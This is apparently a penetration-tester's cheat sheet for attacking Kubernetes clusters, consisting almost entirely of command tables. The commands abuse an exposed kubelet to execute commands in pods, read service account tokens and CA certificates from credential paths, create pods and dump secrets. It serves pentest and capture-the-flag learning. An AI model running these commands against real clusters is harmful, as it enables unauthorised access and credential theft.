# Kubernetes

## Tools

{% embed url="https://github.com/Rolix44/Kubestroyer" %}

{% embed url="https://github.com/stealthcopter/deepce" %}

## Enumeration

| Info                                     | Command                                                                                                     |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| Connect to API                           | `curl https://$ip:8443/ -k`                                                                                 |
| Connect to Kubelet service               | `curl https://$ip:10250/pods -k`                                                                            |
| Use kubeletctl to obtain all of the pods | `kubeletctl --server $ip pods`                                                                              |
| Check command execution on pods          | `kubeletctl --server $ip scan rce`                                                                          |
| Execute command on pod                   | `kubeletctl --server $ip exec "id" -p nginx -c nginx`                                                       |
| Get token                                | `kubeletctl --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx`  |
| Get certificate and save to ca.crt       | `kubeletctl --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx` |
| Export token so it can be used           | `export token="eyJhb...."`                                                                                  |
| Get a list of pods                       | `kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 get pods`                  |
| List default service account rights      | `kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 auth can-i --list`         |
| Create new pod                           | `kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 apply -f f.yaml`           |
| Verify new pod created                   | `kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 get pods`                  |

## General

| Info                                    | Command                                               |
| --------------------------------------- | ----------------------------------------------------- |
| Check permissions                       | `kubectl auth can-i --list`                           |
| Check permissions with token            | `./kubectl auth can-i --list --token=${TOKEN}`        |
| Get secrets                             | `kubectl get secrets`                                 |
| List the content of a secret            | `kubectl describe secret secretflag`                  |
| Get the data content of a secret        | `kubectl get secret secretflag -o 'json'`             |
| Token of a service account is stored in | `/var/run/secrets/kubernetes.io/serviceaccount/token` |
| Get pods with the token                 | `./kubectl get pods --token=${TOKEN}`                 |
